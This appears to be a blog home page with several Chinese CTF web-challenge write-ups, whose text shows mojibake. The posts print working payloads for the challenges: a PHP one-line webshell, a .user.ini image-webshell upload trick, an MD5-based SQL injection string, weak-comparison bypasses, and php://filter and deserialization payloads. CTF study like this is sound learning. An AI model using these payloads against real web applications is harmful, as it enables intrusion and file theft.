<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"jingdaqiang.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
<meta property="og:type" content="website">
<meta property="og:title" content="Tube.D@q1an9">
<meta property="og:url" content="https://jingdaqiang.github.io/index.html">
<meta property="og:site_name" content="Tube.D@q1an9">
<meta property="og:description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="å…­å…¬å­ä¹°å•">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://jingdaqiang.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Tube.D@q1an9</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Tube.D@q1an9</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">æ–‡ä»¶ä¸Šä¼ </a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-03-03 20:50:21" itemprop="dateCreated datePublished" datetime="2021-03-03T20:50:21+08:00">2021-03-03</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/buu-piapiapia/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/03/buu-piapiapia/" class="post-title-link" itemprop="url">buu-piapiapia</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-03-03 17:17:25 / Modified: 19:46:49" itemprop="dateCreated datePublished" datetime="2021-03-03T17:17:25+08:00">2021-03-03</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0CTF-2016-piapiapia1"><a href="#0CTF-2016-piapiapia1" class="headerlink" title="[0CTF 2016]piapiapia1"></a>[0CTF 2016]piapiapia1</h2><p>ä¸æ˜¯sqlæ³¨å…¥ï¼Œæ‰«åå°ï¼Œå‘ç°ç½‘ç«™æºç æ³„æ¼ï¼ˆ<a target="_blank" rel="noopener" href="http://www.zip)/">www.zipï¼‰</a>  </p>
<hr>
<p> config.phpï¼Œé‡Œé¢æœ‰ä¸ªflagå˜é‡ï¼ˆåˆ¤æ–­flagåœ¨config.phpä¸­ï¼Œæƒ³åŠæ³•è¯»å–ï¼‰ï¼š</p>
<pre><code>$config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;;
$config[&#39;username&#39;] = &#39;root&#39;;
$config[&#39;password&#39;] = &#39;&#39;;
$config[&#39;database&#39;] = &#39;&#39;;
$flag = &#39;&#39;;</code></pre>
<hr>
<p> profile.phpæ–‡ä»¶:</p>
<pre><code>&lt;?php
require_once(&#39;class.php&#39;);//profile.phpåŒ…å«äº†class.php
if($_SESSION[&#39;username&#39;] == null) &#123;
    die(&#39;Login First&#39;);
&#125;
$username = $_SESSION[&#39;username&#39;];
$profile=$user-&gt;show_profile($username);//å˜é‡ç”±show_profile()æ–¹æ³•ä¼ é€’ï¼Œç”±äºprofile.phpåŒ…å«äº†class.phpï¼Œæ‰€ä»¥åœ¨class.phpä¸­è·Ÿè¸ªè¯¥æ–¹æ³•
if($profile  == null) &#123;
    header(&#39;Location: update.php&#39;);
&#125;
else &#123;
    $profile = unserialize($profile);//å¯¹$profileå˜é‡è¿›è¡Œäº†ååºåˆ—åŒ–
    $phone = $profile[&#39;phone&#39;];
    $email = $profile[&#39;email&#39;];
    $nickname = $profile[&#39;nickname&#39;];
    $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));//file_get_contents()(å°†ä¸€ä¸ªæ–‡ä»¶è¯»å–åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­)
?&gt;</code></pre>
<ul>
<li>æƒ³åŠæ³•åˆ©ç”¨file_get_contents()è¯»å–config.phpæ–‡ä»¶</li>
</ul>
<hr>
<p>class.php:</p>
<p>è·Ÿè¸ªshow_profile()</p>
<pre><code>public function show_profile($username)
&#123;
    $username = parent::filter($username);
    $where = &quot;username = &#39;$username&#39;&quot;;
    $object = parent::select($this-&gt;table, $where);
    return $object-&gt;profile;
&#125;//å¯¹usernameè¿›è¡Œå¤„ç†ï¼Œè°ƒç”¨äº†çˆ¶ç±»filterå’Œselectæ–¹æ³•</code></pre>
<p>æ¶‰åŠåˆ°çš„æ–¹æ³•å¦‚ä¸‹ï¼ˆclass.phpï¼‰ï¼š</p>
<pre><code>public function select($table, $where, $ret = &#39;*&#39;) &#123;
    $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;
    $result = mysql_query($sql, $this-&gt;link);
    return mysql_fetch_object($result);
&#125;

public function filter($string) &#123;
    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
    $string = preg_replace($escape, &#39;_&#39;, $string);
    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
    return preg_replace($safe, &#39;hacker&#39;, $string);
&#125;//æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„å•å¼•å·å’Œåæ–œæ ä¸ºä¸‹åˆ’çº¿ ï¼Œå¹¶ä¸”æ›¿æ¢å¤šä¸ªå­—ç¬¦ä¸²ä¸ºhackerã€‚implodeå‡½æ•°æ˜¯è¡¨ç¤ºæŠŠæ•°ç»„æ‹¼æ¥èµ·æ¥ï¼Œæ‹¼æ¥ç¬¦æ˜¯ â€œ|â€ï¼š</code></pre>
<hr>
<p>update.phpä¸­ååºåˆ—åŒ–æ“ä½œ:</p>
<pre><code>$user-&gt;update_profile($username, serialize($profile));</code></pre>
<p>è°ƒç”¨äº†class.phpä¸­userå­ç±»çš„update_profileæ–¹æ³•ï¼Œå›åˆ°class.php</p>
<pre><code>public function update_profile($username, $new_profile) &#123;
    $username = parent::filter($username);
    $new_profile = parent::filter($new_profile);
    $where = &quot;username = &#39;$username&#39;&quot;;
    return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
&#125;</code></pre>
<p>åˆåˆ©ç”¨äº†çˆ¶ç±»ä¸­çš„filteræ–¹æ³•ï¼ŒåŒæ—¶è¿˜æœ‰updateæ–¹æ³•</p>
<pre><code>public function update($table, $key, $value, $where) &#123;
    $sql = &quot;UPDATE $table SET $key = &#39;$value&#39; WHERE $where&quot;;
    return mysql_query($sql);
&#125;</code></pre>
<hr>
<p>ç»¼ä¸Šï¼š</p>
<p>unserialize-&gt;show_profileæ–¹æ³•-&gt;selectæ–¹æ³•</p>
<p>serialize-&gt;update_profileæ–¹æ³•-&gt;updateæ–¹æ³•</p>
<p>åˆ†æï¼šé¦–å…ˆæ•°æ®ç»è¿‡åºåˆ—åŒ–ä¼ å…¥åˆ°æ•°æ®åº“ï¼Œç„¶åå–å‡ºçš„æ—¶å€™ååºåˆ—åŒ–ï¼Œéœ€è¦ä¼ å…¥å‚æ•°ï¼Œå¹¶ä¸”æ„é€ æ¶æ„å‚æ•°ï¼Œè€Œupdate.phpè¿™ä¸ªé¡µé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæ•°æ®ä¼ å…¥çš„é¡µé¢ï¼Œçœ‹çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</p>
<pre><code>if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))
die(&#39;Invalid phone&#39;);

if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))
die(&#39;Invalid email&#39;);

if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
die(&#39;Invalid nickname&#39;);</code></pre>
<p>å‰ä¸¤ä¸ªå‚æ•°å¥½åƒéƒ½æ²¡åŠæ³•ç»•è¿‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¥½åƒå¯ä»¥ç»•è¿‡ã€‚<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å‘ç°å‰é¢çš„æ­£åˆ™æ—¶åŒ¹é…æ‰€æœ‰å­—æ¯å’Œæ•°å­—ï¼Œä¹Ÿå°±æ˜¯nicknameæ˜¯å­—æ¯å’Œæ•°å­—çš„è¯ï¼Œå°±æ˜¯çœŸï¼Œstrlen()å‡½æ•°å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œnicknameå°±å®Œå…¨è¢«æˆ‘ä»¬æ§åˆ¶äº†ã€‚</p>
<p>update.php:</p>
<pre><code>$profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
$profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
$profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
$user-&gt;update_profile($username, serialize($profile));</code></pre>
<p>unserialize(str) ä¼šå¿½ç•¥èƒ½å¤Ÿæ­£å¸¸åºåˆ—åŒ–çš„å­—ç¬¦ä¸²åé¢çš„å­—ç¬¦ä¸²ã€‚åƒè¿™æ ·çš„ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥å¯ä»¥ä¸ç”¨ååºåˆ—è¯ï¼Œå°±èƒ½çŸ¥é“å®ƒååºåˆ—åŒ–åæ˜¯ä»€ä¹ˆï¼Œå› ä¸ºå®ƒæ˜¯æœ‰è§„å¾‹çš„<br>a:4:{s:5:â€œphoneâ€;s:11:â€œ11111111111â€;s:5:â€œemailâ€;s:11:â€œ<a href="mailto:&#49;&#x61;&#50;&#x73;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#49;&#x61;&#50;&#x73;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a>â€;s:8:â€œnicknameâ€;s:3:â€œ123â€;s:5:â€œphotoâ€;s:39:â€œupload/f3b94e88bd1bd325af6f62828c8785ddâ€;}<br>a:4æŒ‡çš„æ˜¯ç”±ä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–è€Œæ¥ï¼Œå¹¶ä¸”æœ‰4ä¸ªå€¼ã€‚å¦‚æœæ˜¯å¯¹è±¡çš„è¯ï¼ŒæŠŠaæ”¹æˆäº†Oã€‚ç„¶åå°±æ˜¯ä¸€ä¸ªé”®å€¼åï¼Œä¸€ä¸ªå˜é‡å€¼ï¼š<br>s:5:â€phoneâ€;ç¬¬ä¸€ä¸ªé”®å€¼åï¼Œæ˜¯stringç±»å‹çš„ï¼Œé•¿åº¦ä¸ºäº”ï¼Œs:11:â€11111111111â€;ç¬¬ä¸€ä¸ªå˜é‡å€¼ï¼Œstringç±»å‹ï¼Œé•¿åº¦ä¸º11.è¿™å°±æ˜¯å®ƒçš„è§„å¾‹ã€‚å¦‚æœæˆ‘ä»¬åœ¨è¿™ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²çš„åé¢ï¼Œå†åŠ ä¸Šä¸€äº›å­—ç¬¦ï¼Œåé¢çš„å­—ç¬¦æ˜¯ä¸ä¼šè¢«ååºåˆ—åŒ–çš„<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102703489">https://blog.csdn.net/weixin_44077544/article/details/102703489</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/06/buu-web%E9%9B%B6%E7%A2%8E2-0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="å…­å…¬å­ä¹°å•">
      <meta itemprop="description" content="ä¸€å¤´åŠªåŠ›çš„èœé¸Ÿ">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tube.D@q1an9">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/02/06/buu-web%E9%9B%B6%E7%A2%8E2-0/" class="post-title-link" itemprop="url">buu-webé›¶ç¢2.0</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-02-06 11:03:45" itemprop="dateCreated datePublished" datetime="2021-02-06T11:03:45+08:00">2021-02-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-02-21 19:21:35" itemprop="dateModified" datetime="2021-02-21T19:21:35+08:00">2021-02-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>ï¼ˆâ€¦user.iniçš„åˆ©ç”¨<br>ä¸Šä¼ user.iniè¿›è¡Œä¸Šä¼ åé—¨ã€‚  ï¼‰<br>æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆå°è¯•  shell.txt  </p>
<pre><code>&lt;?php @eval($_POST[&#39;shell&#39;]) ?&gt;  </code></pre>
<p>æ˜¾ç¤º &lt;? in contents!ï¼Œå³å¯¹&lt;?è¿›è¡Œäº†è¿‡æ»¤ï¼Œ<br>ä¸€å¥è¯æœ¨é©¬æ¢ä¸ªå½¢å¼ï¼š  </p>
<pre><code>&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;  </code></pre>
<p>æŠ¥é”™æ˜¾ç¤º exif_imagetype:not image!<br>ï¼ˆexif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚ï¼‰<br>ç®€å•æ¥è¯´å°±æ˜¯æ ¹æ®æ–‡ä»¶å¤´æ¥åˆ¤æ–­æ–‡ä»¶çš„ç±»å‹<br>ä¸‹è¾¹è¯´ä¸‹å¸¸è§çš„å‡ ç§ç±»å‹<br>1.JPG:FFD8FFFE00<br>2.GIF89a:474946383961<br>3.PNG:89504E470D0A<br>ç„¶åå¯¹ä¸€å¥è¯æœ¨é©¬å‰åŠ äº†GIFçš„æ–‡ä»¶å¤´å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œèƒ½ä¸Šä¼ æˆåŠŸï¼Œä½†æ˜¯æ˜¯æŠŠä»–å½“åšå›¾ç‰‡å¤„ç†äº†è€Œä¸æ˜¯ä¸€ä¸ªæ–‡ä»¶ã€‚<br>äºæ˜¯æ‰¾å¤§ä½¬ä»¬çš„WP  </p>
<p>éœ€è¦ç”¨åˆ°.user.ini<br>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ï¼Œç±»ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼šrequire(./a.jpg);<br>æ¶‰åŠåˆ°ä¸¤ä¸ªè®¾ç½®ï¼šauto_prepend_fileå’Œauto_append_file<br>è¿™ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åªæ˜¯åœ¨äºauto_prepend_fileæ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›auto_append_fileåœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰exit()æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰  </p>
<p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.ini æ–‡ä»¶ï¼Œå½“æˆ‘ä»¬å¯¹ç›®å½•ä¸­çš„ä»»ä½•phpæ–‡ä»¶è¿›è¡Œè®¿é—®æ—¶ï¼Œéƒ½ä¼šè°ƒç”¨.user.iniä¸­æŒ‡çš„æ–‡ä»¶ä»¥phpçš„å½¢å¼è¿›è¡Œè¯»å–ã€‚<br>æ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ª.user.iniè¿›è¡Œä¸Šä¼ ã€‚ï¼ˆä¸€å®šè¦åŠ æ–‡ä»¶å¹»æœ¯å¤´ï¼‰  </p>
<pre><code>GIF89a
auto_prepend_file=text.jpg  </code></pre>
<p>å°†text.jpgåŒ…å«åˆ°è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­</p>
<p>å…ˆä¸Šä¼ .user.iniæ–‡ä»¶.ç„¶åå†å»ºç«‹text.jpgæ–‡ä»¶ï¼ˆå›¾ç‰‡é©¬)  </p>
<pre><code>GIF89a
&lt;script language=&#39;php&#39;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code></pre>
<p>ç„¶åç›´æ¥è®¿é—®ç›®å½•å¾—åˆ°flag  </p>
<hr>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>æ‰“å¼€ä¸€çœ‹å•¥ä¹Ÿæ²¡ï¼Œåƒæ˜¯æ³¨å…¥é¢˜ï¼Œè¾“1æŠ“åŒ…ï¼Œæ”¾åŒ…ï¼Œåœ¨è¯·æ±‚å¤´é‡Œæœ‰æç¤ºï¼š  </p>
<ul>
<li>Hint: select * from â€˜adminâ€™ where password=md5($pass,true)<br>è¦è€ƒå¯Ÿmd5($password,true)çš„ç”¨æ³•:  </li>
</ul>
<p>å½“md5åçš„hexè½¬æ¢æˆå­—ç¬¦ä¸²åï¼Œå¦‚æœåŒ…å«â€™orâ€™è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæ•´ä¸ªsqlå˜æˆï¼š  </p>
<pre><code>SELECT * FROM admin WHERE pass = &#39;&#39;or&#39;6&lt;trash&gt;&#39;  </code></pre>
<p>å°±å¯ä»¥æ³¨å…¥<br>æä¾›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼šffifdyop<br>md5åï¼š276f722736c95d99e921722cf9ed621c<br>å†è½¬æˆå­—ç¬¦ï¼šâ€™orâ€™6  </p>
<ul>
<li>æ‰€ä»¥ password=ffifdyop </li>
</ul>
<p>æ”¾åŒ…å‡ºç°</p>
<pre><code>&lt;script&gt;window.location.replace(&#39;./levels91.php&#39;)&lt;/script&gt;</code></pre>
<p>è®¿é—®/levels91.php<br>çœ‹æºç   </p>
<pre><code>&lt;!--
$a = $GET[&#39;a&#39;];
$b = $_GET[&#39;b&#39;];

if($a != $b &amp;&amp; md5($a) == md5($b))&#123;
// wow, glzjin wants a girl friend.
--&gt;</code></pre>
<p>aå’Œbå€¼ä¸ç›¸ç­‰ï¼Œä½†ä»–ä»¬å¯¹åº”çš„MD5å€¼ç›¸ç­‰  </p>
<ul>
<li><p>æ•°ç»„å¼±ç±»å‹æ¯”è¾ƒï¼Œç”¨â€˜a[]=1&amp;b[]2â€™ç»•è¿‡<br>å¾—ä»£ç ï¼š  </p>
  <?php
  error_reporting(0);
  include "flag.php";

  highlight_file(__FILE__);

  if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
  echo $flag;
  }
æ„é€ param1[]=1&param2[]=2</li>
<li><p>å’Œä¸Šé¢çš„å¦‚å‡ºä¸€è¾™ï¼Œä¸åŒçš„æ˜¯ä¸Šé¢æ˜¯getä¼ å‚ï¼Œè¿™ä¸ªè¦ç”¨åˆ°postä¼ å‚ï¼Œç”¨ç«ç‹ï¼Œå¾—å‡ºflag</p>
</li>
</ul>
<hr>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>é€†è½¬æ€ç»´ï¼ˆå“¦å“¦ï¼‰<br>è¿™ä¸ªé¢˜è€ƒå¯Ÿphpä¼ªåè®®</p>
<pre><code>&lt;?php  
$text = $_GET[&quot;text&quot;];
$file = $_GET[&quot;file&quot;];
$password = $_GET[&quot;password&quot;];
if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;
echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
if(preg_match(&quot;/flag/&quot;,$file))&#123;
    echo &quot;Not now!&quot;;
    exit(); 
&#125;else&#123;
    include($file);  //useless.php
    $password = unserialize($password);
    echo $password;
&#125;
&#125;
else&#123;
    highlight_file(__FILE__);
&#125;
?&gt;  </code></pre>
<p>file_get_contents()å‡½æ•°æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p>
<p>if(isset($text)&amp;&amp;(file_get_contents($text,â€™râ€™)===â€welcome to the zjctfâ€))<br>éœ€è¦ä¼ å…¥textä¸”å…¶å†…å®¹ä¸ºwelcome to the zjctfï¼Œåˆ©ç”¨dataåè®®ï¼šï¼ˆå…ˆå°†ä¼ å…¥å†…å®¹è½¬åŒ–ä¸ºBase64ï¼‰    </p>
<pre><code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=  </code></pre>
<p>include($file);å¤„å¯åˆ©ç”¨åˆ©ç”¨ php æµ filterï¼šè¯»å–æç¤ºuseless.phpæ–‡ä»¶å†…å®¹<br>ç”¨base64è¯»å–useless.php</p>
<pre><code>file=php://filter/read=convert.base64-encode/resource=useless.php  </code></pre>
<p>è§£ç åå¾—åˆ°ï¼š  </p>
<pre><code>&lt;?php  

class Flag&#123;  //flag.php  
    public $file;  
    public function __tostring()&#123;  
        if(isset($this-&gt;file))&#123;  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        &#125;  
    &#125;  
&#125;  
?&gt;    </code></pre>
<p>åœ¨æœ¬åœ°è¿›è¡Œåºåˆ—åŒ–å¾—åˆ°ç»“æœ  </p>
<pre><code>&lt;?php

class Flag&#123;
public $file=&#39;flag.php&#39;;  
    public function __tostring()&#123;  
        if(isset($this-&gt;file))&#123;  
            echo file_get_contents($this-&gt;file); 
            echo &quot;&lt;br&gt;&quot;;
        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
        &#125;  
    &#125;  
&#125; 
$password=new Flag();
echo serialize($password);
?&gt;</code></pre>
<p>å¾—åˆ°ç»“æœä¸ºï¼šO:4:â€Flagâ€:1:{s:4:â€fileâ€;s:8:â€flag.phpâ€;}<br>æœ€ç»ˆpayload:</p>
<pre><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></pre>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>ä¸Šä¼ å›¾ç‰‡é©¬<br>ä¸Šä¼ .htaccessè§£æå›¾ç‰‡é©¬<br>æ”¹Content-Typeä¸º image/jpeg<br><a target="_blank" rel="noopener" href="http://61593e21-1112-4daa-a4b8-26995ae7fb7f.node3.buuoj.cn/upload/3af718f83369656ff209986a918a311f/1.jpg">http://61593e21-1112-4daa-a4b8-26995ae7fb7f.node3.buuoj.cn/upload/3af718f83369656ff209986a918a311f/1.jpg</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
